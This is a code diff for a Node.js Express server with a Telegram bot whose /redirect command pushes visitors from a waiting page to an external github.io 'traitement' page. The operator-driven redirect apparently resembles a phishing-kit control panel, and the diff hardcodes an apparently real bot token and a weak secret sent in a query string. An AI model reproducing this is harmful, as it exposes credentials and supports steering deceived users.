@@ -1,29 +1,36 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
+const axios = require('axios');
 const path = require('path');
 
+// إعداد Express
 const app = express();
 const port = 3000;
 
-// استبدل هذا بالتوكن الجديد من @BotFather
-const token = '7854414810:AAGyuC8sZ-zHLOdNHl81GScSPYsCOesNok8'; 
+// إعداد Telegram Bot (ضع التوكن هنا)
+const token = '7854414810:AAGyuC8sZ-zHLOdNHl81GScSPYsCOesNok8'; // ⚠️ استبدل هذا بـ Token الخاص بك
 const bot = new TelegramBot(token, { polling: true });
 
 // كلمة سر للتحكم في API
-const API_SECRET = "MY_STRONG_SECRET";
+const API_SECRET = "MY_STRONG_SECRET123";
 
+// متغيرات التوجيه
 let shouldRedirect = false;
+const TARGET_PAGE = 'https://ahssj5667.github.io/exomple/traitement.html'; // الصفحة الهدف
 
-// Frontend
+// Middleware لخدمة الملفات الثابتة
+app.use(express.static('public'));
+
+// صفحة الانتظار (Frontend)
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // API للتحقق من التوجيه
 app.get('/api/check-redirect', (req, res) => {
     res.json({
         redirect: shouldRedirect,
-        redirectUrl: 'traitement.html'
+        redirectUrl: TARGET_PAGE
     });
 });
 
@@ -33,20 +40,25 @@ app.get('/api/trigger-redirect', (req, res) => {
         return res.status(403).send("غير مسموح!");
     }
     shouldRedirect = true;
-    res.send('✅ تم التوجيه!');
+    res.send('✅ تم تفعيل التوجيه!');
 });
 
-// أمر البوت مع التحقق
+// Telegram Bot Command
 bot.onText(/\/redirect/, (msg) => {
     const chatId = msg.chat.id;
-    const apiUrl = `http://your-server.com/api/trigger-redirect?secret=${API_SECRET}`;
+    const apiUrl = `http://localhost:3000/api/trigger-redirect?secret=${API_SECRET}`;
 
     bot.sendMessage(chatId, "جاري التوجيه...")
-        .then(() => fetch(apiUrl))
-        .then(() => bot.sendMessage(chatId, '🚀 تم التوجيه!'))
-        .catch(() => bot.sendMessage(chatId, '❌ فشل في التوجيه!'));
+        .then(() => axios.get(apiUrl))
+        .then(() => bot.sendMessage(chatId, '🚀 تم توجيه المستخدم إلى الصفحة التالية!'))
+        .catch((err) => {
+            console.error(err);
+            bot.sendMessage(chatId, '❌ فشل في التوجيه! تأكد من تشغيل الخادم.');
+        });
 });
 
+// تشغيل الخادم
 app.listen(port, () => {
     console.log(`✅ الخادم يعمل على http://localhost:${port}`);
+    console.log(`📌 الصفحة الهدف: ${TARGET_PAGE}`);
 });
